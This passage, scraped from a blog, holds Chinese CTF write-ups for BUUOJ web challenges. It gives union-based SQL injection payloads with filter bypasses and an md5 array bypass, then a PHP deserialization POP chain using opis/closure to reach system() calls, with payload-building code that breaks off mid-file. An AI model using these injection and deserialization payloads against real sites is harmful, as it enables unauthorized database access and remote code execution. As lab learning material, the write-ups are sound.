-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318192.png" alt="image-20211002023322880" style="zoom:50%;" />
-
-<ul>
-<li>想到用<code>union</code>联合注入，尝试了很多次但是没有成功，后来发现可以大小写绕过（笑，现在怎么这么多双层防护的题目）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,3;#</span><br><span class="line">1 Union Select 1,2,database();# &#x3D;&gt; ctf</span><br></pre></td></tr></table></figure>
-
-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318193.png" alt="image-20211002031727834" style="zoom:50%;" />
-
-<ul>
-<li>由于or被过滤了，所以这里需要使用无表名注入，且<code>from</code>和<code>where</code>都需要大小写绕过：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,group_concat(table_name) From sys.schema_table_statistics_with_buffer Where table_schema&#x3D;database();# &#x3D;&gt; 没有输出</span><br><span class="line">1 Union Select 1,2,group_concat(table_name) From mysql.innodb_table_stats Where database_name &#x3D; database();#</span><br><span class="line">&#x3D;&gt; flagisthere,ilikectf</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>接下来就是无列名注入，以下两个payload都失败了：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,&#96;3&#96; From (Select 1,2,3 Union Select * From ilikectf);#</span><br><span class="line">1 Union Select 1,2,b From (Select 1,2,3 As b,4,5 Union Select * From ilikectf)a;#</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>最后使用下面式子成功：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select * From ilikectf;# &#x3D;&gt; 36476,sgrsgef,gg.php</span><br></pre></td></tr></table></figure>
-
-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318194.png" alt="image-20211002031655165" style="zoom:50%;" />
-
-<ul>
-<li>来到<code>gg.php</code>：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(base64_encode(hex2bin(strrev(bin2hex(<span class="variable">$_GET</span>[<span class="string">&#x27;sy&#x27;</span>]))))===<span class="variable">$secret</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ohhhhh so close !!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>后一个是md5数组绕过。另外一个<code>$secret</code>变量，让我们回想起首页页面源代码中的字符：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 告诉你一个秘密: hjZX1pcnVmdmRzZWZ&#x2F;bGlg&#x3D;&#x3D; --&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将其反过来解密即可：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hex2bin(strrev(bin2hex(base64_decode(&#39;hjZX1pcnVmdmRzZWZ&#x2F;bGlg&#x3D;&#x3D;&#39;))));</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ilovectfverymuch</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>所以最后的payload：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?sy&#x3D;ilovectfverymuch</span><br><span class="line">POST:</span><br><span class="line">ha[]&#x3D;a&amp;lo[]&#x3D;b</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>获得flag：</li>
-</ul>
-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318195.png" alt="image-20211002031342627" style="zoom:50%;" />
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;23c2e3e4-d2f8-4770-9c7d-84142263a47a&#125;</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/07/ctfmanage/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-xxc" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/05/xxc/">xxc</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/10/05/xxc/" class="archive-article-date">
-  	<time datetime="2021-10-05T06:05:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>转载自qq群<code>.</code>师傅发布的md文件</p>
-<p>原题地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/36/challenges">https://buuoj.cn/match/matches/36/challenges</a></p>
-<h3 id="xxc"><a href="#xxc" class="headerlink" title="xxc"></a>xxc</h3><ul>
-<li>打开网页提示<code>一条链子</code>，使用dirmap扫描到网站源码<a target="_blank" rel="noopener" href="http://www.zip,进行代码审计./">www.zip，进行代码审计。</a></li>
-<li>index.php其中存在反序列化操作，这道题确定是一道序列化的题目：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_loader</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;./class/&#x27;</span> . (str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$class</span>) . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">&quot;_loader&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;一条链子&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>我们先来学习一下<code>_loader()</code>函数，这是一个自动加载函数，在PHP5中，当我们实例化一个未定义的类时，就会触发此函数。</p>
-</li>
-<li><p><code>spl_autoload_register(&#39;loadprint&#39;)</code>与<code>__autoload()</code>函数有异曲同工之妙，PHP碰到没有定义的类就执行<code>loadprint()</code>函数。</p>
-</li>
-<li><p>所以我们在<code>index.php</code>中可以自由的实例化存在的类。由于是反序列化的题目，我们先来看看入口点<code>__destruct()</code>和<code>__wakeup()</code>函数是否存在：</p>
-<ul>
-<li><code>\Control\State\StopHook.php</code>中发现了析构函数，调用了同类中的<code>_exit()</code>函数，其中<code>$process-&gt;stop();</code>可能会触发<code>__call()</code>函数，而<code>!$process-&gt;isRunning</code>可能会触发<code>__get()</code>函数：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StopHook</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [<span class="string">&#x27;auto&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$states</span> = [<span class="string">&#x27;started&#x27;</span>, <span class="string">&#x27;running&#x27;</span>, <span class="string">&#x27;finished&#x27;</span>, <span class="string">&#x27;waiting&#x27;</span>, <span class="string">&#x27;fail&#x27;</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$processes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_exit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_exit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在<code>\Faker\MyGenerator.php</code>中找到这两个函数，<code>__call()</code>函数中<code>echo $this-&gt;defaultCall;</code>一句可能会触发<code>__toString()</code>函数：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$defaultValue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$arg_array</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在<code>\Method\Func\GetFile.php</code>找到<code>__toString()</code>函数，调用了同类中的<code>getFiles()</code>函数，发现函数的中调用了<code>isset()</code>函数，如果该类中不存在该属性，会触发<code>__isset()</code>函数：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getFiles();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFiles</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;flag) <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        <span class="variable">$s</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;flag-&gt;&#123;<span class="keyword">$this</span>-&gt;value&#125;)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span> += <span class="variable">$file</span>-&gt;read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在<code>Method\Func\GetDefault.php</code>中找到<code>__isset()</code>函数，调用了同类中的<code>popup()</code>函数，其中<code>return $s($length);</code>可能会触发<code>__invoke()</code>函数：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetDefault</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">popup</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$s</span>-&gt;flag != <span class="string">&quot;myTest&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>(<span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$property</span> != <span class="string">&quot;test&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;popup(<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>最后在<code>\Method\Func\GenerateFile.php</code>中找到<code>__invoke()</code>函数，且存在<code>call_user_func()</code>。没有想到在php5中是可以直接赋值在一个没有初始化的变量上的2333。</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenerateFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;myGen(<span class="variable">$param</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myGen</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;buffer-&gt;read;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;source-&gt;generate, <span class="variable">$length</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>整个链子理清楚了，但是发现<code>call_user_func()</code>的第二个参数被写死了，因为<code>$this-&gt;popup(666);</code>调用的时候将<code>666</code>传入了<code>__invoke($param)</code>，最后也就作为<code>$length</code>变量传入了<code>myGen($length)</code>函数。</p>
-</li>
-<li><p>现在只能够调用类似<code>phpinfo()</code>等不需要参数的程序，并不能够rce，该怎么办呢？</p>
-<ul>
-<li>这时候我们注意到存在<code>function.php</code>，发现这个cms是基于<code>opis/closure</code>搭建的，网址：<a target="_blank" rel="noopener" href="https://github.com/opis/closure">https://github.com/opis/closure</a></li>
-<li>该项目是用来闭包类对象的，官方文档：<a target="_blank" rel="noopener" href="https://opis.io/closure/3.x/serialize.html%E3%80%82php%E4%B8%AD%E7%9A%84%E9%97%AD%E5%8C%85%E5%87%BD%E6%95%B0%EF%BC%88%E4%BB%85%E5%AF%B9php%EF%BC%89%E5%8D%B3%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%80%E8%88%AC%E6%98%AF%E6%97%A0%E6%B3%95%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%EF%BC%8C%E4%B8%80%E8%88%AC%E4%BC%9A%E6%8A%A5%E9%94%99%EF%BC%9A">https://opis.io/closure/3.x/serialize.html。php中的闭包函数（仅对php）即匿名函数，一般是无法进行序列化的，一般会报错：</a></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &#39;Exception&#39; with message &#39;Serialization of &#39;Closure&#39; is not allowed&#39;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用这个项目，可以将闭包包装成一个<code>Opis\Closure\SerializableClosure</code>对象，然后使用标准的<code>serialize()</code>进行序列化。也可以使用<code>Opis\Closure\serialize</code>函数序列化任意对象。</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:32:&quot;Opis\Closure\SerializableClosure&quot;:156:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:33:&quot;function()&#123; eval(\system(&#39;ls&#39;));&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;0000000054d6224100000000237e90a4&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>那么我们可以将匿名函数通过<code>serialize()</code>函数经过一次序列化和反序列化，这样他就能作为<code>SerializableClosure</code>对象被序列化。或者直接将<code>generate</code>变量赋值为<code>SerializableClosure</code>类。</p>
-</li>
-<li><p>payload：</p>
-</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">StopHook</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; processes = <span class="keyword">array</span>(<span class="keyword">new</span> \Faker\MyGenerator());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">new</span> StopHook();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MyGenerator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">defaultValue</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; defaultValue = <span class="keyword">new</span> \Method\Func\GetFile();</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetFile</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span 